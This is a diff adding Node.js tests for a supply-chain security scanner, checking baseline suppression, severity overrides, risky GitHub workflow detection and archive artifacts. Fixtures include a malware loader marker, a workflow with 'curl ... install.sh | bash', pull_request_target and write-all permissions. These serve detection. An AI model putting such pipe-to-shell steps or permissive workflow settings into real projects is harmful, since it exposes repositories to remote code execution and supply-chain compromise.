@@ -89,6 +89,40 @@ test('scan supports executable allowlist entries with sha256', () => {
   assert.equal(tampered.findings[0].id, 'allowed-executable-hash-mismatch');
 });
 
+test('scan suppresses reviewed findings through baseline', () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'security-guardrails-baseline-'));
+  const filePath = path.join(root, 'tailwind.config.js');
+  fs.writeFileSync(filePath, "global.i='2-30-4';\n");
+  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(filePath)).digest('hex');
+  fs.writeFileSync(path.join(root, '.security-guardrails.baseline.json'), JSON.stringify({
+    findings: [{
+      findingId: 'void-dokkaebi-loader-marker',
+      file: 'tailwind.config.js',
+      sha256,
+      reason: 'fixture accepted for test',
+      owner: 'security',
+      expiresAt: '2999-01-01',
+    }],
+  }, null, 2));
+
+  const result = scan({ cwd: root, roots: ['tailwind.config.js'] });
+
+  assert.equal(result.ok, true);
+  assert.equal(result.findings.length, 0);
+  assert.equal(result.suppressedFindings.length, 1);
+});
+
+test('scan honors fail-on severity overrides', () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'security-guardrails-fail-on-'));
+  fs.writeFileSync(path.join(root, 'pnpm-lock.yaml'), 'tarball: https://raw.githubusercontent.com/example/package.tgz\n');
+
+  const defaultResult = scan({ cwd: root, roots: ['pnpm-lock.yaml'] });
+  const strictResult = scan({ cwd: root, roots: ['pnpm-lock.yaml'], failOn: ['medium'] });
+
+  assert.equal(defaultResult.ok, true);
+  assert.equal(strictResult.ok, false);
+});
+
 test('scan audit mode reports findings without blocking', () => {
   const root = fs.mkdtempSync(path.join(os.tmpdir(), 'security-guardrails-audit-'));
   fs.writeFileSync(path.join(root, 'tailwind.config.js'), "global.i='2-30-4';\n");
@@ -138,6 +172,37 @@ test('scan audits additional package manager lockfiles as warnings', () => {
   assert.equal(result.ok, true);
   assert.equal(result.findings[0].id, 'lockfile-suspicious-host');
   assert.equal(result.findings[0].severity, 'medium');
+});
+
+test('scan audits risky GitHub workflow patterns', () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'security-guardrails-workflow-'));
+  fs.mkdirSync(path.join(root, '.github', 'workflows'), { recursive: true });
+  fs.writeFileSync(path.join(root, '.github', 'workflows', 'release.yml'), [
+    'on: pull_request_target',
+    'permissions: write-all',
+    'jobs:',
+    '  test:',
+    '    steps:',
+    '      - uses: actions/checkout@v4',
+    '      - run: curl https://example.test/install.sh | bash',
+    '      - run: npm publish',
+  ].join('\n'));
+
+  const result = scan({ cwd: root, roots: ['.github'] });
+
+  assert.equal(result.ok, false);
+  assert.ok(result.findings.some((item) => item.id === 'workflow-curl-pipe-shell'));
+  assert.ok(result.findings.some((item) => item.id === 'workflow-publish-without-provenance'));
+});
+
+test('scan audits committed archive artifacts', () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'security-guardrails-archive-'));
+  fs.writeFileSync(path.join(root, 'payload.asar'), 'archive');
+
+  const result = scan({ cwd: root, roots: ['payload.asar'], failOn: ['medium'] });
+
+  assert.equal(result.ok, false);
+  assert.equal(result.findings[0].id, 'archive-artifact-in-source-tree');
 });
 
 test('scan loads external signatures file', () => {
